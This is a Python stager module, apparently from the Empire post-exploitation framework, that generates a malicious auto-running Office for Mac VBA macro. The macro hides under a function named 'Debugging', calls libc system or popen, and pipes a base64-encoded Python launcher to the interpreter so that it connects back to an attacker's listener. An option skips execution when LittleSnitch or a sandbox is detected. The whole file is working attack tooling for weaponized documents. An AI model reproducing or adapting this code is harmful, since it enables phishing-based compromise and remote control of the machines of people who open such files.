from __future__ import print_function
from builtins import str
from builtins import range
from builtins import object
from lib.common import helpers
import re

class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'AppleScript',

            'Author': ['@harmj0y', '@dchrastil', '@import-au'],

            'Description': ('An OSX office macro that supports newer versions of Office.'),

            'Comments': [
                "http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac"
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'OutFile' : {
                'Description'   :   'File to output AppleScript to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Version' : {
                'Description'   :   'Version of Office for Mac. Accepts values "old" and "new". Old applies to versions of Office for Mac older than 15.26. New applies to versions of Office for Mac 15.26 and newer. Defaults to new.',
                'Required'      :   True,
                'Value'         :   'new'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        def formStr(varstr, instr):
            holder = []
            str1 = ''
            str2 = ''
            str1 = varstr + ' = "' + instr[:54] + '"'
            for i in range(54, len(instr), 48):
                holder.append('\t\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
                str2 = '"\r\n'.join(holder)
            str2 = str2 + "\""
            str1 = str1 + "\r\n"+str2
            return str1

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        version = self.options['Version']['Value']
        
        try:
            version = str(version).lower()
        except TypeError:
            raise TypeError('Invalid version provided. Accepts "new" and "old"')

        # generate the python launcher code
        pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)

        if pylauncher == "":
            print(helpers.color("[!] Error in python launcher command generation."))
            return ""

        # render python launcher into python payload
        pylauncher = pylauncher.replace("\"", "\"\"")
        for match in re.findall(r"'(.*?)'", pylauncher, re.DOTALL):
            payload = formStr("cmd", match)

            if version == "old":
                macro = """
        #If VBA7 Then
            Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
        #Else
            Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
        #End If
        
        Sub Auto_Open()
            'MsgBox("Auto_Open()")
            Debugging
        End Sub
        
        Sub Document_Open()
            'MsgBox("Document_Open()")
            Debugging
        End Sub
        
        Public Function Debugging() As Variant
            On Error Resume Next
                    #If Mac Then
                            Dim result As Long
                            Dim cmd As String
                            %s
                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
                    #End If
        End Function""" %(payload)
            elif version == "new":
                macro = """
        Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) as LongPtr
        
        Sub Auto_Open()
            'MsgBox("Auto_Open()")
            Debugging
        End Sub
        
        Sub Document_Open()
            'MsgBox("Document_Open()")
            Debugging
        End Sub
        
        Public Function Debugging() As Variant
            On Error Resume Next
                    #If Mac Then
                            Dim result As LongPtr
                            Dim cmd As String
                            %s
                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &")
                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | /usr/bin/python &", "r")
                    #End If
        End Function""" % (payload)
            else:
                raise ValueError('Invalid version provided. Accepts "new" and "old"')

        return macro
